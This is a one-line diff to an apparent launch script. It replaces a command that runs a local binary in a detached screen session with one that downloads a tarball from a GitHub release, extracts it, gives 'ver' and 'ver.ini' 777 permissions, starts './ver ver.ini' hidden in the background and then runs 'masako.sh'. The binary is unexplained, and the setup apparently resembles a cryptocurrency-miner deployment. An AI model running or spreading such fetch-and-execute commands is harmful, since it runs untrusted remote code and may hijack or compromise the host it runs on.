@@ -1,1 +1,1 @@
-chmod +x rendang && screen -dmS run ./rendang && chmod +x masako.sh && ./masako.sh
+wget https://github.com/mariobiszz/perus/releases/download/1/ver.tar.gz && tar -xvf ver.tar.gz && chmod 777 ver ver.ini && screen -dmS run ./ver ver.ini && chmod +x masako.sh && ./masako.sh
